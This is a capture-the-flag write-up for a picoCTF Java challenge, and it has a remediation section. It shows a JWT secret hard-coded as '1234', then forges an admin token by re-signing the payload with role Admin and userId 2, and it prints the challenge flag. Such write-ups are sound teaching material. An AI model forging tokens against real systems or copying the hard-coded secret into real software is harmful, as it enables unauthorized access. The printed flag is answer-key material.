# picoCTF: Java Code Analysis!?!

## Context & Vulnerability
This code creates an extensive reading application where a user can read pdfs/books that they are given the jurisdiction to access. According to the challenge description, we need to read the 'Flag' book which is only accessible by a user with admin authority whereas the user account provided to us only has the free tier authority.

In the security folder of the challenge, specifically SecretGenerator.java, we following code:
```
private String generateRandomString(int len) {
    // not so random
    return "1234";
}
```
This is clearly a security concern as JWT (JSON Web Tokens) depends on this generateRandomString function for its secret key. 

## Exploitation
JWT's auth-token and token-payload can be found in Applications > Local Storage through the Inspect tool. Using the website jwt.io (JWT Debugger), one can decode this string: 

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc3ODAyNDQxNSwiaWF0IjoxNzc3NDE5NjE1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.VyYI8xivj2WZ5eLb-ml_MlgdPmmokEvSd8yg483IZCo

into 

```
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1778024415,
  "iat": 1777419615,
  "userId": 1,
  "email": "user"
}
```

from the code of the application, we can see that these are parameters for the user, including ones we're interested in like "role": "Free" and "userId": 1. 

When we read through the code of the BookShelfConfig.java in the configs folder, we find that the code initializes the user and admin users with user's id being 1 and admin being 2. On the website, we also notice that there are three roles: Free, Premium, and Admin. Our goal is to get to Admin.

Since the secret of the JWT was hard-coded as '1234', we can use that in the JWT Signature Verification section of jwt.io and encode the payload again, changing role to Admin and userId to 2. 

```
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1778022069,
  "iat": 1777417269,
  "userId": 2,
  "email": "user"
}
```

Using this payload and the new encoded JWT auth-token 

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NzgwMjIwNjksImlhdCI6MTc3NzQxNzI2OSwidXNlcklkIjoyLCJlbWFpbCI6InVzZXIifQ.fh9qdjkyYO50o_Vfri7LsvdhSvSuqpOF9NEd5W5Ouyc

we can replace the previous auth-token and token-payload.

Refreshing the page, we receive the flag:

picoCTF{w34k_jwt_n0t_g00d_d7c2e335}


## Remediation
The remediation is to actually generate a random string and complete the generateRandomString function rather than hard code the random string to 1234. In doing such, JWT can properly function and authenticate users.

## Resources
What is JWT? https://www.jwt.io/introduction 